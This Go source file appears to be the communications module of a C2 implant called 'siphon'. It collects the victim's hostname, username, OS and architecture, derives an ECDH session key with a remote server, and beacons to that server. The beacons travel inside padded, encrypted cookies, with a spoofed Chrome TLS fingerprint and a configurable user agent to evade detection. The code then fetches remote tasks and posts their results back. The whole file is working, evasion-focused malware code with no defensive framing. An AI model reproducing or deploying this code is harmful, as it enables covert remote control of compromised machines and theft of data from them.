package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"time"

	tls "github.com/refraction-networking/utls"

	"siphon/shared"
)

// userAgentOverride is set via -ldflags "-X main.userAgentOverride=..." to match
// the target environment's browser. Falls back to a recent Chrome UA if empty.
var userAgentOverride = ""

var userAgent = func() string {
	if userAgentOverride != "" {
		return userAgentOverride
	}
	return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}()

// cookiePadTarget is the target size for the JSON envelope before base64 encoding.
// Padding normalizes cookie sizes across beacons so they don't stand out.
const cookiePadTarget = 512

var (
	sessionKey  []byte
	implantID   string
	implantInfo shared.Beacon
	httpClient  *http.Client
)

// padEnvelope adds random hex padding to the Envelope.Pad field so the
// marshalled JSON is approximately cookiePadTarget bytes.
func padEnvelope(env *shared.Envelope) {
	trial, _ := json.Marshal(env)
	deficit := cookiePadTarget - len(trial)
	if deficit <= 0 {
		return
	}
	// Each hex byte = 2 chars; account for JSON overhead of "p":"..." field (~7 bytes).
	padBytes := (deficit - 7) / 2
	if padBytes <= 0 {
		return
	}
	buf := make([]byte, padBytes)
	if _, err := rand.Read(buf); err != nil {
		return
	}
	env.Pad = hex.EncodeToString(buf)
}

func init() {
	httpClient = &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				conn, err := net.DialTimeout(network, addr, 15*time.Second)
				if err != nil {
					return nil, err
				}
				host, _, _ := net.SplitHostPort(addr)
				tlsConn := tls.UClient(conn, &tls.Config{
					ServerName:         host,
					InsecureSkipVerify: true,
				}, tls.HelloChrome_Auto)
				if err := tlsConn.HandshakeContext(ctx); err != nil {
					conn.Close()
					return nil, err
				}
				return tlsConn, nil
			},
		},
	}
}

// InitImplant gathers system info, performs the ECDH handshake with the server,
// and establishes a session key. It sends an initial beacon carrying the
// ephemeral public key so the server can derive the same session key.
func InitImplant() error {
	implantID = shared.GenerateID()

	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	username := "unknown"
	if u, err := user.Current(); err == nil {
		username = u.Username
	}

	implantInfo = shared.Beacon{
		ID:       implantID,
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
	}

	// Generate ephemeral ECDH keypair.
	ephemPriv, err := GenerateEphemeralKey()
	if err != nil {
		return fmt.Errorf("keygen: %w", err)
	}

	// Decode the server's static public key embedded at build time.
	serverPubBytes, err := hex.DecodeString(serverPK)
	if err != nil || len(serverPubBytes) == 0 {
		// Fall back to the hardcoded byte slice in comms.go if serverPK ldflag
		// was not provided.
		serverPubBytes = serverPublicKey
	}
	if len(serverPubBytes) == 0 {
		return fmt.Errorf("server public key not configured")
	}

	sessionKey, err = DeriveSessionKey(ephemPriv, serverPubBytes)
	if err != nil {
		return fmt.Errorf("ecdh: %w", err)
	}

	// Send initial beacon; include ephemeral public key so the server can
	// derive the matching session key.
	pubKeyHex := hex.EncodeToString(ephemPriv.PublicKey().Bytes())
	return sendBeacon(pubKeyHex)
}

// CheckIn sends a GET /api/news request with the encrypted beacon in a cookie
// and returns the task the server sends back (nil if none).
func CheckIn() (*shared.Task, error) {
	payload, err := json.Marshal(implantInfo)
	if err != nil {
		return nil, err
	}

	nonce, ct, err := Encrypt(sessionKey, payload)
	if err != nil {
		return nil, err
	}

	env := shared.Envelope{
		ID:         implantID,
		Nonce:      hex.EncodeToString(nonce),
		Ciphertext: hex.EncodeToString(ct),
	}
	shared.SignEnvelope(&env, authToken)
	padEnvelope(&env)
	envJSON, err := json.Marshal(env)
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequest(http.MethodGet, c2Host+beaconURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", userAgent)
	req.AddCookie(&http.Cookie{
		Name:  "session",
		Value: base64.StdEncoding.EncodeToString(envJSON),
	})

	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		io.Copy(io.Discard, resp.Body)
		return nil, fmt.Errorf("unexpected status: %d", resp.StatusCode)
	}

	limitedBody := io.LimitReader(resp.Body, 1*1024*1024) // 1 MB max
	var respEnv shared.Envelope
	if err := json.NewDecoder(limitedBody).Decode(&respEnv); err != nil {
		return nil, nil // no task
	}
	io.Copy(io.Discard, resp.Body)

	if !shared.VerifyEnvelope(&respEnv, authToken) {
		return nil, fmt.Errorf("HMAC verification failed on server response")
	}

	// Empty response (no Nonce/Ciphertext) means no task queued.
	if respEnv.Nonce == "" || respEnv.Ciphertext == "" {
		return nil, nil
	}

	nonceBytes, err := hex.DecodeString(respEnv.Nonce)
	if err != nil {
		return nil, err
	}
	ctBytes, err := hex.DecodeString(respEnv.Ciphertext)
	if err != nil {
		return nil, err
	}

	plain, err := Decrypt(sessionKey, nonceBytes, ctBytes)
	if err != nil {
		return nil, err
	}

	var task shared.Task
	if err := json.Unmarshal(plain, &task); err != nil {
		return nil, err
	}
	return &task, nil
}

// SendResult encrypts a TaskResult and POSTs it to /api/submit.
func SendResult(result shared.TaskResult) error {
	payload, err := json.Marshal(result)
	if err != nil {
		return err
	}

	nonce, ct, err := Encrypt(sessionKey, payload)
	if err != nil {
		return err
	}

	env := shared.Envelope{
		ID:         implantID,
		Nonce:      hex.EncodeToString(nonce),
		Ciphertext: hex.EncodeToString(ct),
	}
	shared.SignEnvelope(&env, authToken)
	body, err := json.Marshal(env)
	if err != nil {
		return err
	}

	req, err := http.NewRequest(http.MethodPost, c2Host+submitURL, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Content-Type", "application/json")

	resp, err := httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status: %d", resp.StatusCode)
	}
	return nil
}

// sendBeacon sends the initial encrypted beacon including the ephemeral public
// key in Envelope.PubKey so the server can derive the session key.
func sendBeacon(pubKeyHex string) error {
	payload, err := json.Marshal(implantInfo)
	if err != nil {
		return err
	}

	nonce, ct, err := Encrypt(sessionKey, payload)
	if err != nil {
		return err
	}

	env := shared.Envelope{
		PubKey:     pubKeyHex,
		Nonce:      hex.EncodeToString(nonce),
		Ciphertext: hex.EncodeToString(ct),
	}
	shared.SignEnvelope(&env, authToken)
	padEnvelope(&env)
	envJSON, err := json.Marshal(env)
	if err != nil {
		return err
	}

	req, err := http.NewRequest(http.MethodGet, c2Host+beaconURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", userAgent)
	req.AddCookie(&http.Cookie{
		Name:  "session",
		Value: base64.StdEncoding.EncodeToString(envJSON),
	})

	resp, err := httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status: %d", resp.StatusCode)
	}
	return nil
}
